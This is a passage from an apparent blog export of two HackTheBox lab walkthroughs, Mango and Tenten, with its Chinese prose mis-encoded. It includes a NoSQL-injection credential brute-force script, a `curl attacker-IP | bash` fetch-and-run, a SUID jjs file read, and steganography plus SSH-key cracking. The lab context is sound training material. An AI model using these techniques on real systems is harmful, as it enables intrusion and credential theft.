<h2 id="0x03-Pentesting">0x03 Pentesting</h2>
<p>Nmapæ‰«æé¶æœºç«¯å£</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kali@kali ~ % nmap -A -Pn -T4 -p- 10.10.10.162</span><br><span class="line">Starting Nmap 7.80 ( https:&#x2F;&#x2F;nmap.org ) at 2020-03-11 02:44 UTC</span><br><span class="line">Nmap scan report for 10.10.10.162</span><br><span class="line">Host is up (0.060s latency).</span><br><span class="line">Not shown: 65532 closed ports</span><br><span class="line">PORT    STATE SERVICE  VERSION</span><br><span class="line">22&#x2F;tcp  open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 a8:8f:d9:6f:a6:e4:ee:56:e3:ef:54:54:6d:56:0c:f5 (RSA)</span><br><span class="line">|   256 6a:1c:ba:89:1e:b0:57:2f:fe:63:e1:61:72:89:b4:cf (ECDSA)</span><br><span class="line">|_  256 90:70:fb:6f:38:ae:dc:3b:0b:31:68:64:b0:4e:7d:c9 (ED25519)</span><br><span class="line">80&#x2F;tcp  open  http     Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: 403 Forbidden</span><br><span class="line">443&#x2F;tcp open  ssl&#x2F;http Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: Mango | Search Base</span><br><span class="line">| ssl-cert: Subject: commonName&#x3D;staging-order.mango.htb&#x2F;organizationName&#x3D;Mango Prv Ltd.&#x2F;stateOrProvinceName&#x3D;None&#x2F;countryName&#x3D;IN</span><br><span class="line">| Not valid before: 2019-09-27T14:21:19</span><br><span class="line">|_Not valid after:  2020-09-26T14:21:19</span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line">| tls-alpn: </span><br><span class="line">|_  http&#x2F;1.1</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 44.12 seconds</span><br></pre></td></tr></table></figure>
<p>ä¸»è¦æ¥çœ‹443ç«¯å£ï¼Œç”¨httpsè®¿é—®ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200311110756.png" alt=""></p>
<p>è¿™ä¸ªé¡µé¢å¥½åƒé™¤äº†<code>Analytics</code>ä¹‹å¤–å…¶ä»–éƒ½æ˜¯æ‘†è®¾</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200311110931.png" alt=""></p>
<p>ç ”ç©¶äº†ä¼šå‘ç°è¿™ä¸ªAnalyticsä¹Ÿæ˜¯ä¸€ä¸ªæ‘†è®¾ï¼Œorzã€‚ã€‚ã€‚å›å»å†çœ‹çœ‹nmapæ‰«æå‡ºæ¥çš„ç«¯å£åˆå‘ç°äº†ä¸€ä¸ªä¿¡æ¯</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssl-cert: Subject: commonName&#x3D;staging-order.mango.htb&#x2F;organizationName&#x3D;Mango Prv</span><br><span class="line">Ltd.&#x2F;stateOrProvinceName&#x3D;None&#x2F;countryName&#x3D;IN</span><br></pre></td></tr></table></figure>
<blockquote>
<p>commonName: å…¬ç”¨åç§°ï¼Œä¸€èˆ¬ä¸ºç½‘ç«™åŸŸå</p>
</blockquote>
<p>ç¼–è¾‘<code>/etc/hosts</code>æ–‡ä»¶æ·»åŠ è§£æï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">10.10.10.162   staging-order.mango.htb</span><br></pre></td></tr></table></figure>
<p>çœ‹åˆ°äº†ä¸€ä¸ªç™»å½•ç•Œé¢</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200311112440.png" alt=""></p>
<p>å¥½å§ï¼Œè¿™é‡Œæœ‰ç‚¹å‘ï¼Œæ˜¯åŸºäºMongoDBçš„NoSQLæ³¨å…¥ï¼Œè¯•ä¸€ä¸‹è¿™é‡Œçš„Payloadï¼š<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL Injection</a></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200312133707.png" alt=""></p>
<p>æ³¨å…¥æˆåŠŸåæ˜¯è¿™ç§ç•Œé¢ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200312140148.png" alt=""></p>
<p>æ²¡æœ‰ä»€ä¹ˆå¯ä»¥åˆ©ç”¨çš„ï¼Œç°åœ¨å›è¿‡å¤´å»çˆ†ç ´ç”¨æˆ·å’Œå¯†ç ï¼Œè„šæœ¬å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://staging-order.mango.htb/index.php&quot;</span></span><br><span class="line">headers = &#123;<span class="string">&quot;Host&quot;</span>: <span class="string">&quot;staging-order.mango.htb&quot;</span>&#125;</span><br><span class="line">possible_chars = list(string.ascii_letters) + list(string.digits) + [<span class="string">&quot;\\&quot;</span> + c  <span class="keyword">for</span> c <span class="keyword">in</span> string.punctuation]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    usernames = get_users()</span><br><span class="line">    <span class="keyword">if</span> usernames:</span><br><span class="line">        print(<span class="string">&#x27;Finished!&#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> username <span class="keyword">in</span> usernames:</span><br><span class="line">            password = get_password(username)</span><br><span class="line">            print(<span class="string">&#x27;&#123;&#125;:&#123;&#125;&#x27;</span>.format(username, password))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">&#x27;Not Found!&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_users</span>():</span></span><br><span class="line">    usernames = []</span><br><span class="line">    payload = &#123;<span class="string">&quot;username[$regex]&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;password[$regex]&quot;</span>:<span class="string">&quot;.*&quot;</span>, <span class="string">&quot;login&quot;</span>:<span class="string">&quot;login&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> possible_chars:</span><br><span class="line">        username = <span class="string">&quot;^&quot;</span> + c</span><br><span class="line">        payload[<span class="string">&quot;username[$regex]&quot;</span>] = username + <span class="string">&quot;.*&quot;</span></span><br><span class="line">        r = requests.post(url, data=payload, headers=headers, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">if</span> r.status_code == <span class="number">302</span>:</span><br><span class="line">            print(<span class="string">&quot;username start with character:&quot;</span> + c)</span><br><span class="line">            <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>, get_username_length() - <span class="number">1</span>):</span><br><span class="line">                <span class="keyword">for</span> c2 <span class="keyword">in</span> possible_chars:</span><br><span class="line">                    payload[<span class="string">&quot;username[$regex]&quot;</span>] = username + c2 + <span class="string">&quot;.*&quot;</span></span><br><span class="line">                    r2 = requests.post(url, data=payload, headers=headers, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">                    <span class="keyword">if</span> r2.status_code == <span class="number">302</span>:</span><br><span class="line">                        username += c2</span><br><span class="line">                        print(username[<span class="number">1</span>:])</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                <span class="comment">#if c2 == possible_chars[-1]:</span></span><br><span class="line">            print(<span class="string">&quot;Found username: &#123;&#125;&quot;</span>.format(username[<span class="number">1</span>:]))</span><br><span class="line">            usernames.append(username[<span class="number">1</span>:])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> usernames</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_password</span>(<span class="params">username</span>):</span></span><br><span class="line">    payload = &#123;<span class="string">&quot;username&quot;</span>: username, <span class="string">&quot;password[$regex]&quot;</span>: <span class="string">&quot;&quot;</span>, <span class="string">&quot;login&quot;</span>: <span class="string">&quot;login&quot;</span>&#125;</span><br><span class="line">    password = <span class="string">&quot;^&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>, get_pass_length(username)):</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> possible_chars:</span><br><span class="line">            payload[<span class="string">&quot;password[$regex]&quot;</span>] = password + c + <span class="string">&quot;.*&quot;</span></span><br><span class="line">            r = requests.post(url, data=payload, headers=headers, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">            <span class="keyword">if</span> r.status_code == <span class="number">302</span>:</span><br><span class="line">                password += c</span><br><span class="line">                print(password[<span class="number">1</span>:])</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    password = password[<span class="number">1</span>:].replace(<span class="string">&quot;\\&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;Found &#123;&#125;&#x27;s password: &quot;</span>.format(username) + password)</span><br><span class="line">    <span class="keyword">return</span> password</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_username_length</span>():</span></span><br><span class="line">    length = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        payload = &#123;<span class="string">&quot;username[$regex]&quot;</span>: <span class="string">&quot;.&#123;&#123;&#123;&#125;&#125;&#125;&quot;</span>.format(length), <span class="string">&quot;password[$ne]&quot;</span>:<span class="string">&quot;&quot;</span>, <span class="string">&quot;login&quot;</span>:<span class="string">&quot;login&quot;</span>&#125;</span><br><span class="line">        r =requests.post(url, data=payload, headers=headers, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">if</span> r.status_code == <span class="number">302</span>:</span><br><span class="line">            length += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> length <span class="number">-1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_pass_length</span>(<span class="params">username</span>):</span></span><br><span class="line">    length = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        payload = &#123;<span class="string">&quot;username&quot;</span>: username, <span class="string">&quot;password[$regex]&quot;</span>: <span class="string">&quot;.&#123;&#123;&#123;&#125;&#125;&#125;&quot;</span>.format(length), <span class="string">&quot;login&quot;</span>: <span class="string">&quot;login&quot;</span>&#125;</span><br><span class="line">        r = requests.post(url, data=payload, headers=headers, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">if</span> r.status_code == <span class="number">302</span>:</span><br><span class="line">            length += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> length <span class="number">-1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<p>è¿è¡Œç»“æœå¦‚ä¸‹ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200317235136.png" alt=""></p>
<p>å¾—åˆ°ä¸¤ä¸ªè´¦æˆ·å’Œå¯†ç ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mango:h3mXK8RhU~f&#123;]f5H</span><br><span class="line">admin:t9KcS3&gt;!0B#2</span><br></pre></td></tr></table></figure>
<p>ç™»å½•mongoè´¦æˆ·</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~&#x2F;HTB&#x2F;Boxes&#x2F;Mango# ssh mango@10.10.10.162</span><br><span class="line">mango@10.10.10.162&#39;s password:</span><br><span class="line">&lt;...&gt;</span><br><span class="line">Last login: Mon Nov 11 20:58:31 2019 from 10.10.14.7</span><br><span class="line">mango@mango:~$ su admin</span><br><span class="line">Password:</span><br><span class="line">$ whoami</span><br><span class="line">admin</span><br><span class="line">$ cd &#x2F;home&#x2F;admin</span><br><span class="line">$ ls -la</span><br><span class="line">total 24</span><br><span class="line">drwxr-xr-x 2 admin admin 4096 Sep 30 03:20 .</span><br><span class="line">drwxr-xr-x 4 root root 4096 Sep 27 14:02 ..</span><br><span class="line">lrwxrwxrwx 1 admin admin 9 Sep 27 14:30 .bash_history -&gt; &#x2F;dev&#x2F;null</span><br><span class="line">-rw-r--r-- 1 admin admin 220 Apr 4 2018 .bash_logout</span><br><span class="line">-rw-r--r-- 1 admin admin 3771 Apr 4 2018 .bashrc</span><br><span class="line">-rw-r--r-- 1 admin admin 807 Apr 4 2018 .profile</span><br><span class="line">-r-------- 1 admin admin 33 Sep 27 14:29 user.txt</span><br></pre></td></tr></table></figure>
<p>è·‘ä¸€ä¸ªLinEnum.shææƒè„šæœ¬çœ‹æœ‰æ²¡æœ‰ä»€ä¹ˆå¯ä»¥åˆ©ç”¨çš„</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin@mango:&#x2F;home&#x2F;admin$ curl 10.10.14.42:80&#x2F;LinEnum.sh | bash</span><br><span class="line">&lt;...&gt;</span><br><span class="line">[-] SGID files:</span><br><span class="line">&lt;...&gt;</span><br><span class="line">-rwsr-sr-- 1 root admin 10352 Jul 18 18:21 &#x2F;usr&#x2F;lib&#x2F;jvm&#x2F;java-11-openjdkamd64&#x2F;</span><br><span class="line">bin&#x2F;jjs</span><br></pre></td></tr></table></figure>
<blockquote>
<p>ä¹Ÿå¯ä»¥ä½¿ç”¨å‘½ä»¤ï¼š<code>find / -user root -perm -4000 2&gt;/dev/null</code></p>
</blockquote>
<p>æŸ¥çœ‹åˆ©ç”¨æ–¹å¼ï¼š<a href="https://gtfobins.github.io/gtfobins/jjs/">https://gtfobins.github.io/gtfobins/jjs/</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin@mango:&#x2F;home&#x2F;admin$ jjs</span><br><span class="line">Warning: The jjs tool is planned to be removed from a future JDK release</span><br><span class="line">jjs&gt; var BufferedReader &#x3D; Java.type(&quot;java.io.BufferedReader&quot;);</span><br><span class="line">jjs&gt; var FileReader &#x3D; Java.type(&quot;java.io.FileReader&quot;);</span><br><span class="line">jjs&gt; var br &#x3D; new BufferedReader(new FileReader(&quot;&#x2F;root&#x2F;root.txt&quot;));</span><br><span class="line">jjs&gt; while ((line &#x3D; br.readLine()) !&#x3D; null) &#123; print(line); &#125;;</span><br><span class="line">8a8efXXXXXXXXXXXXXXXXXXXXXXXXXb15</span><br></pre></td></tr></table></figure>
<h2 id="0x04-Summary">0x04 Summary</h2>
<p>Mongoæ˜¯ä¸€ä¸ªä¸»è¦è€ƒå¯ŸNoSQLæ³¨å…¥çš„çš„é¶æœºï¼Œå¬è¿™ä¸ªé¶æœºçš„åå­—å°±æ„Ÿè§‰æ•°æ®åº“ç”¨çš„æ˜¯MongoDBï¼Œä¸ºæ­¤ç¬”è€…ä¸“é—¨å†™äº†ä¸€ä¸ªå…³äºNoSQLæ³¨å…¥ä¹‹MongoDBæ–‡ç« ï¼Œæ„Ÿå…´è¶£çš„åŒå­¦å¯ä»¥å»çœ‹ä¸€çœ‹ã€‚è¿™æ¬¡ä¸»è¦è€ƒå¯ŸNoSQLçš„ç›²æ³¨æŠ€å·§ï¼Œå…¶å®ä¹Ÿæ²¡ä»€ä¹ˆæŠ€å·§ï¼Œä¸»è¦è¿˜æ˜¯å†™è„šæœ¬çš„èƒ½åŠ›å§ï¼Œæ„Ÿè§‰è¿˜æ˜¯ä¸å¤ªè¡Œï¼Œéœ€è¦è°ƒè¯•å¾ˆå¤šæ¬¡æ‰èƒ½passï¼Œä½†ç›¸ä¿¡å…ˆæ¨¡ä»¿ååˆ›é€ ï¼ŒåšæŒè‡ªå·±åŠ¨æ‰‹å†™ï¼Œåº”è¯¥è¿˜æ˜¯æ²¡é—®é¢˜çš„ã€‚</p>
]]></content>
      <categories>
        <category>é¶æœº</category>
        <category>HTB</category>
      </categories>
      <tags>
        <tag>é¶æœº</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB::Tenten Walkthrough</title>
    <url>/Target_drone/HackTheBox/6.HTB-Tenten-walkthrough/</url>
    <content><![CDATA[<h1 id="HTB-Tenten-Walkthrough">HTB::Tenten Walkthrough</h1>
<h2 id="0x01-Information">0x01 Information</h2>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200317230613.png" alt=""></p>
<h2 id="0x02-Tools-and-Tis">0x02 Tools and Tis</h2>
<ul>
<li>nmap</li>
<li>wpscan</li>
<li>JohnTheRipper</li>
<li>steghide</li>
<li>wordpress job-manager plugin</li>
</ul>
<h2 id="0x03-Pentesting">0x03 Pentesting</h2>
<p>nmapæ‰«æé¶æœºç«¯å£ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Nmap scan report for 10.10.10.10</span><br><span class="line">Host is up (0.23s latency).</span><br><span class="line">Not shown: 65533 filtered ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22&#x2F;tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 ec:f7:9d:38:0c:47:6f:f0:13:0f:b9:3b:d4:d6:e3:11 (RSA)</span><br><span class="line">|   256 cc:fe:2d:e2:7f:ef:4d:41:ae:39:0e:91:ed:7e:9d:e7 (ECDSA)</span><br><span class="line">|_  256 8d:b5:83:18:c0:7c:5d:3d:38:df:4b:e1:a4:82:8a:07 (ED25519)</span><br><span class="line">80&#x2F;tcp open  http    Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">|_http-generator: WordPress 4.7.3</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.18 (Ubuntu)</span><br><span class="line">|_http-title: Job Portal &amp;#8211; Just another WordPress site</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Aggressive OS guesses: Linux 3.10 - 4.11 (92%), Linux 3.13 (92%), Linux 3.13 or 4.2 (92%), Linux 3.16 (92%), Linux 3.2 - 4.9 (92%), Linux 4.2 (92%), Linux 4.4 (92%), Linux 4.8 (92%), Linux 4.9 (91%), Linux 3.12 (90%)</span><br><span class="line">No exact OS matches for host (test conditions non-ideal).</span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE (using port 80&#x2F;tcp)</span><br><span class="line">HOP RTT       ADDRESS</span><br><span class="line">1   237.00 ms 10.10.16.1</span><br><span class="line">2   309.00 ms 10.10.10.10</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 541.37 seconds</span><br></pre></td></tr></table></figure>
<p>ä¸€çœ‹80ç«¯å£è¿è¡Œwordpressç«™ç‚¹ï¼Œä¸å¤šBBï¼Œç›´æ¥ä¸Šwpscanå·¥å…·æ‰«æï¼š</p>
<blockquote>
<p>wpscanä½¿ç”¨æ•™ç¨‹ï¼š<a href="https://www.cnblogs.com/Xy--1/p/12236684.html">https://www.cnblogs.com/Xy--1/p/12236684.html</a></p>
</blockquote>
<p>çœ‹åˆ°è¿™ä¸ªç‰ˆæœ¬æœ‰å¾ˆå¤šXSSæ¼æ´åˆ©ç”¨ï¼Œä½†æ˜¯æ‰“è¿™ä¸ªé¶æœºXSSæ¼æ´ä¸€èˆ¬éƒ½æ˜¯æ²¡ä»€ä¹ˆä½œç”¨ï¼Œæ¥ç€å¾€ä¸‹çœ‹ï¼Œå‘ç°ç«™ç‚¹å®‰è£…äº†ä¸€ä¸ª<code>job-manager</code>çš„æ’ä»¶ã€‚</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200318195036.png" alt=""></p>
<p>ç‚¹å‡»è¿›å…¥ç”³è¯·èŒä½çš„é¡µé¢ï¼Œå‘ç°æœ‰ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ çš„åœ°æ–¹ï¼Œå…ˆä¸Šä¼ ä¸€ä¸ªæ­£å¸¸å›¾ç‰‡ï¼Œå†åˆ°<code>http://10.10.10.10/wp-content/%year%/%month%/%filename%</code>æŸ¥çœ‹å‘ç°å¯ä»¥æ­£å¸¸æ˜¾ç¤ºã€‚å†å°è¯•ç”¨BurpSuiteæ”¹ä¸€ä¸‹æ–‡ä»¶å†…å®¹ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200318205438.png" alt=""></p>
<p>æœåŠ¡ç«¯æ£€æµ‹äº†åç¼€åï¼Œç›®å‰å·²çŸ¥åªèƒ½ä¸Šä¼ jpgï¼Œpngç­‰å›¾ç‰‡ç±»å‹ã€‚</p>
<p><a href="https://vagmour.eu/cve-2015-6668-cv-filename-disclosure-on-job-manager-wordpress-plugin/">https://vagmour.eu/cve-2015-6668-cv-filename-disclosure-on-job-manager-wordpress-plugin/</a></p>
<p>è¿™ç¯‡æ–‡ç« æåˆ°äº†ä¸€ç§ç±»ä¼¼å¹³è¡Œè¶Šæƒçš„æ‰‹æ³•ï¼š<code>http://10.10.10.10/index.php/jobs/apply/8/</code>ï¼Œè¿™é‡Œ8ç±»ä¼¼æ‹›è˜æ–‡ç« çš„idï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨BurpSuiteéå†å®ƒï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200318203806.png" alt=""></p>
<p>å¦å¤–ï¼Œè¿™é‡Œæ‰©å±•ä¸€ç§æ€è·¯ï¼Œå¯ä»¥ç›´æ¥å†™bashè„šæœ¬è·‘å‡ºæ¥ï¼Œè¿™ç§ç»“æœæ›´ä¸ºç›´è§‚ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> $(seq 1 20); <span class="keyword">do</span> <span class="built_in">echo</span> -n <span class="string">&quot;<span class="variable">$i</span>: &quot;</span>; curl -s http://10.10.10.10/index.php/<span class="built_in">jobs</span>/apply/<span class="variable">$i</span> | grep <span class="string">&#x27;&lt;title&gt;&#x27;</span>; <span class="keyword">done</span></span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200318211616.png" alt=""></p>
<p>id=13çš„è¿™ç¯‡æ–‡ç« æ ‡é¢˜æ˜¯<code>HackerAccessGranted</code>ï¼Œæ¯”è¾ƒå¯ç–‘ï¼Œå¦å¤–id=17çš„æ–‡ç« æ ‡é¢˜æ˜¯æˆ‘åˆšåˆšä¸Šä¼ çš„å›¾ç‰‡çš„æ–‡ä»¶åã€‚è¿™ä¸¤ç‚¹ç»“åˆèµ·æ¥ï¼Œæˆ‘ä»¬æ€€ç–‘<code>HackerAccessGranted</code>æ˜¯ä¸æ˜¯ä¹Ÿæ˜¯ç”¨æˆ·ä¸Šä¼ çš„ä¸€å¼ å›¾ç‰‡çš„æ–‡ä»¶åã€‚ä½†æ˜¯è¦è®¿é—®åˆ°è¿™å¼ å›¾ç‰‡ï¼Œæˆ‘ä»¬å¿…é¡»çŸ¥é“ä¸Šä¼ çš„å¹´ä»½å’Œæœˆä»½ï¼Œæƒ³åˆ°è¿™é‡Œï¼Œé‚£å°±å†™ä¸€ä¸ªPythonè„šæœ¬è·‘ä¸€ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">website = <span class="string">&#x27;http://10.10.10.10/wp-content/uploads/&#x27;</span></span><br><span class="line">filename = <span class="string">&#x27;HackerAccessGranted&#x27;</span></span><br><span class="line">exts = [<span class="string">&#x27;jpg&#x27;</span>, <span class="string">&#x27;png&#x27;</span>, <span class="string">&#x27;gif&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> year <span class="keyword">in</span> range(<span class="number">2016</span>, <span class="number">2018</span>):</span><br><span class="line">    <span class="keyword">for</span> month <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">13</span>):</span><br><span class="line">        <span class="keyword">for</span> ext <span class="keyword">in</span> exts:</span><br><span class="line">            url = website + str(year) + <span class="string">&#x27;/&#x27;</span> + <span class="string">&quot;&#123;:02&#125;&quot;</span>.format(month) + <span class="string">&#x27;/&#x27;</span> + filename + <span class="string">&#x27;.&#x27;</span> + ext</span><br><span class="line">            req = requests.get(url)</span><br><span class="line">            <span class="keyword">if</span> req.status_code == <span class="number">404</span>:</span><br><span class="line">                url = website</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(<span class="string">&#x27;[+] URL Found: &#x27;</span> + url)</span><br></pre></td></tr></table></figure>
<p>å¾—åˆ°ç»“æœ<code>http://10.10.10.10/wp-content/uploads/2017/04/HackerAccessGranted.jpg</code></p>
<p>æŠŠå›¾ç‰‡ç”¨binwalkæ£€æŸ¥ä¸€ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ binwalk HackerAccessGranted.jpg </span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">0             0x0             JPEG image data, JFIF standard 1.01</span><br></pre></td></tr></table></figure>
<p>å†ç”¨éšå†™å·¥å…·steghideæå–ä¸€ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ steghide extract -sf HackerAccessGranted.jpg </span><br><span class="line">Enter passphrase: </span><br><span class="line">wrote extracted data to &quot;id_rsa&quot;.</span><br></pre></td></tr></table></figure>
<p>OKï¼Œæå–å‡ºäº†<code>id_rsa</code>æ–‡ä»¶ï¼Œå†ç”¨Johnä¸€æŠŠæ¢­</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ python &#x2F;usr&#x2F;share&#x2F;john&#x2F;ssh2john.py id_rsa &gt; id_rsa.hash </span><br><span class="line">$ &#x2F;sbin&#x2F;john id_rsa.hash --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt</span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password hash (SSH [RSA&#x2F;DSA&#x2F;EC&#x2F;OPENSSH (SSH private keys) 32&#x2F;64])</span><br><span class="line">Cost 1 (KDF&#x2F;cipher [0&#x3D;MD5&#x2F;AES 1&#x3D;MD5&#x2F;3DES 2&#x3D;Bcrypt&#x2F;AES]) is 0 for all loaded hashes</span><br><span class="line">Cost 2 (iteration count) is 1 for all loaded hashes</span><br><span class="line">Will run 4 OpenMP threads</span><br><span class="line">Note: This format may emit false positives, so it will keep trying even after</span><br><span class="line">finding a possible candidate.</span><br><span class="line">Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status</span><br><span class="line">superpassword    (id_rsa)</span><br><span class="line">Warning: Only 2 candidates left, minimum 4 needed for performance.</span><br><span class="line">1g 0:00:00:08 DONE (2020-03-18 10:52) 0.1173g&#x2F;s 1683Kp&#x2F;s 1683Kc&#x2F;s 1683KC&#x2F;sa6_123..*7Â¡Vamos!</span><br><span class="line">Session completed</span><br></pre></td></tr></table></figure>
<p>å¥½äº†ï¼Œå¾—åˆ°äº†å¯†ç ï¼Œä½†æ˜¯ç°åœ¨å¥½åƒè¿˜æ²¡æœ‰ç”¨æˆ·åorzâ€¦ï¼Œå†ç”¨wpscanæšä¸¾ç«™ç‚¹çš„ç”¨æˆ·å</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[i] User(s) Identified:</span><br><span class="line"></span><br><span class="line">[+] takis</span><br><span class="line"> | Found By: Author Posts - Author Pattern (Passive Detection)</span><br><span class="line"> | Confirmed By:</span><br><span class="line"> |  Rss Generator (Passive Detection)</span><br><span class="line"> |  Wp Json Api (Aggressive Detection)</span><br><span class="line"> |   - http:&#x2F;&#x2F;10.10.10.10&#x2F;index.php&#x2F;wp-json&#x2F;wp&#x2F;v2&#x2F;users&#x2F;?per_page&#x3D;100&amp;page&#x3D;1</span><br><span class="line"> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> |  Login Error Messages (Aggressive Detection)</span><br></pre></td></tr></table></figure>
<p>å†ç”¨sshç™»å½•é¶æœºï¼Œè·å–<code>user.txt</code></p>
